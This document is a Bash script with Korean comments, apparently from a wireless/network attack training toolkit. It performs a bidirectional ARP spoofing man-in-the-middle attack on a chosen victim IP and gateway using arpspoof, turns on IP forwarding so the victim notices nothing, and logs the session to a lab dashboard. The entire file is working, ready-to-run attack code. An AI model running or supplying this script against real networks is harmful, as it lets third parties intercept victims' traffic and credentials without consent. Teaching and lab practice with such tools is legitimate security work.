#!/usr/bin/env bash
# ============================================================
# et_arp_spoof.sh - ARP 스푸핑(중간자, MITM) 공격
#
#   피해자에게는 "게이트웨이 = 내 MAC", 게이트웨이에는 "피해자 = 내 MAC" 이라고
#   위조 ARP 를 반복 주입해, 둘 사이 트래픽이 공격자를 거쳐 흐르게 만든다(MITM).
#   ip_forward 를 켜 두므로 피해자는 인터넷이 그대로 되는 것처럼 보인다.
#
#   핵심 도구: arpspoof (dsniff)
#
# 사용 예:
#   sudo ARP_TARGET=192.168.10.24 bash arp_spoofing/et_arp_spoof.sh
#   sudo ARP_TARGET=192.168.10.24 ARP_GATEWAY=192.168.10.1 ARP_IFACE=eth0 \
#        bash arp_spoofing/et_arp_spoof.sh
#
# 종료: Ctrl+C (arpspoof 가 정상 ARP 를 재전송해 피해자/게이트웨이 테이블 복구)
# ============================================================
set -u

_script_dir="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
# et_config.conf / et_logger.sh 는 스크립트와 같은 폴더 또는 상위(프로젝트 루트)에 있다.
[ -f "${_script_dir}/et_config.conf" ] || _script_dir="${_script_dir}/.."
_config_file="${_script_dir}/et_config.conf"

_cli_interface="${interface:-}"
if [ -f "${_config_file}" ]; then
	# shellcheck disable=SC1090
	source <(tr -d '\r' < "${_config_file}")
fi
[ -n "${_cli_interface}" ] && interface="${_cli_interface}"

# --- 파라미터 (env 로 덮어쓰기 가능) ---
# 공격 인터페이스: ARP_IFACE > interface > 기본 라우트의 인터페이스
ARP_IFACE="${ARP_IFACE:-${interface:-}}"
if [ -z "${ARP_IFACE}" ]; then
	ARP_IFACE=$(ip route show default 2>/dev/null | awk '/default/{print $5; exit}')
fi
# 게이트웨이: ARP_GATEWAY > 기본 라우트의 게이트웨이
ARP_GATEWAY="${ARP_GATEWAY:-}"
if [ -z "${ARP_GATEWAY}" ]; then
	ARP_GATEWAY=$(ip route show default 2>/dev/null | awk '/default/{print $3; exit}')
fi
ARP_TARGET="${ARP_TARGET:-}"                 # 피해자 IP (필수)

# --- 로거 준비 ---
log_dir="${WFSAT_LOG_DIR:-${log_dir:-/tmp/et_logs}}"
tmpdir="$(mktemp -d)/"
_logger_file="${_script_dir}/et_logger.sh"
if [ -f "${_logger_file}" ]; then
	# shellcheck disable=SC1090
	source <(tr -d '\r' < "${_logger_file}")
fi

# --- root 확인 ---
if [ "$(id -u 2>/dev/null || echo 1)" != "0" ]; then
	echo "[!] Root 권한이 필요합니다. sudo 로 실행하세요." >&2
	exit 1
fi

# --- 필수 도구 ---
if ! command -v arpspoof > /dev/null 2>&1; then
	echo "[!] arpspoof 가 필요합니다.  Install: sudo apt update && sudo apt install -y dsniff" >&2
	exit 1
fi

# --- 파라미터 검증 ---
if [ -z "${ARP_IFACE}" ]; then
	echo "[!] 공격 인터페이스를 찾을 수 없습니다. ARP_IFACE=<iface> 로 지정하세요." >&2
	exit 1
fi
if [ ! -d "/sys/class/net/${ARP_IFACE}" ]; then
	echo "[!] '${ARP_IFACE}' 인터페이스가 없습니다." >&2
	exit 1
fi
if [ -z "${ARP_GATEWAY}" ]; then
	echo "[!] 게이트웨이 IP 를 찾을 수 없습니다. ARP_GATEWAY=<ip> 로 지정하세요." >&2
	exit 1
fi
if [ -z "${ARP_TARGET}" ]; then
	echo "[!] 피해자 IP 가 필요합니다. ARP_TARGET=<피해자 IP> 로 지정하세요." >&2
	echo "    예: sudo ARP_TARGET=192.168.10.24 bash arp_spoofing/et_arp_spoof.sh" >&2
	exit 1
fi

# --- 피해자 MAC 조회(가능하면). 이벤트 표시에 사용 ---
ping -c1 -W1 "${ARP_TARGET}" > /dev/null 2>&1 || true
_target_mac=$(ip neigh show "${ARP_TARGET}" 2>/dev/null | awk '/lladdr/{print $5; exit}')
[ -z "${_target_mac}" ] && _target_mac="unknown"

# --- 상태/정리용 전역 ---
_sp1_pid=""      # 피해자에게: gateway = 공격자
_sp2_pid=""      # 게이트웨이에게: victim = 공격자
_ipfwd_old=""

_cleanup() {
	echo
	echo "[*] ARP 스푸핑 종료 중…"
	# arpspoof 는 TERM 수신 시 정상 ARP 를 재전송해 테이블을 복구한다.
	[ -n "${_sp1_pid}" ] && kill "${_sp1_pid}" 2>/dev/null
	[ -n "${_sp2_pid}" ] && kill "${_sp2_pid}" 2>/dev/null
	[ -n "${_sp1_pid}" ] && wait "${_sp1_pid}" 2>/dev/null
	[ -n "${_sp2_pid}" ] && wait "${_sp2_pid}" 2>/dev/null
	# ip_forward 원복
	[ -n "${_ipfwd_old}" ] && echo "${_ipfwd_old}" > /proc/sys/net/ipv4/ip_forward 2>/dev/null
	# attack_stop 기록 + 최종 summary
	if command -v log_finalize > /dev/null 2>&1; then
		log_finalize 2>/dev/null || true
	fi
	rm -rf "${tmpdir}" 2>/dev/null
	echo "[+] 정리 완료. (ARP 테이블은 정상 값으로 재전송됨)"
}
trap _cleanup EXIT INT TERM

# --- IP 포워딩 켜기(MITM: 트래픽을 끊지 않고 중계) ---
_ipfwd_old=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

echo "[*] ARP 스푸핑 시작 (MITM)"
echo "    인터페이스 : ${ARP_IFACE}"
echo "    피해자     : ${ARP_TARGET} (${_target_mac})"
echo "    게이트웨이 : ${ARP_GATEWAY}"

# --- 양방향 arpspoof (각각 백그라운드) ---
arpspoof -i "${ARP_IFACE}" -t "${ARP_TARGET}" "${ARP_GATEWAY}" > "${tmpdir}sp1.log" 2>&1 &
_sp1_pid=$!
arpspoof -i "${ARP_IFACE}" -t "${ARP_GATEWAY}" "${ARP_TARGET}" > "${tmpdir}sp2.log" 2>&1 &
_sp2_pid=$!

sleep 1
if ! kill -0 "${_sp1_pid}" 2>/dev/null || ! kill -0 "${_sp2_pid}" 2>/dev/null; then
	echo "[!] arpspoof 실행 실패. 로그:" >&2
	sed 's/^/    /' "${tmpdir}sp1.log" "${tmpdir}sp2.log" 2>/dev/null >&2
	exit 1
fi

# --- 로그 시작 (대시보드 실습 탭 연동) ---
essid="(ARP 스푸핑 · MITM)"
bssid="${ARP_GATEWAY} → ${ARP_TARGET}"
et_dos_attack="ARP Spoofing"
channel=0                      # 유선/LAN 레벨 공격이라 채널 개념 없음(summary 숫자 필드용 0)
interface="${ARP_IFACE}"
if command -v log_init > /dev/null 2>&1; then
	log_init
fi
# 피해자를 "연결된 클라이언트"로 한 번 기록 → 실습 탭 이벤트/클라이언트 수 표시
if command -v _log_event > /dev/null 2>&1; then
	printf 'DHCPACK on %s to %s\n' "${ARP_TARGET}" "${_target_mac}" >> "${tmpdir}clts.txt"
	_log_event "client_connected" "{\"ip\":\"${ARP_TARGET}\",\"mac\":\"${_target_mac}\"}"
	command -v _log_update_summary > /dev/null 2>&1 && _log_update_summary 2>/dev/null || true
fi

echo "[+] MITM 진행 중. 피해자↔게이트웨이 트래픽이 이 호스트를 거칩니다."
echo "    (패킷 확인 예: sudo tcpdump -i ${ARP_IFACE} host ${ARP_TARGET})"
echo "    (종료하려면 Ctrl+C)"

# --- 메인 루프: arpspoof 가 살아있는 동안 상태 갱신 ---
while kill -0 "${_sp1_pid}" 2>/dev/null && kill -0 "${_sp2_pid}" 2>/dev/null; do
	if command -v _log_update_summary > /dev/null 2>&1; then
		_log_update_summary 2>/dev/null || true
	fi
	sleep 5
done
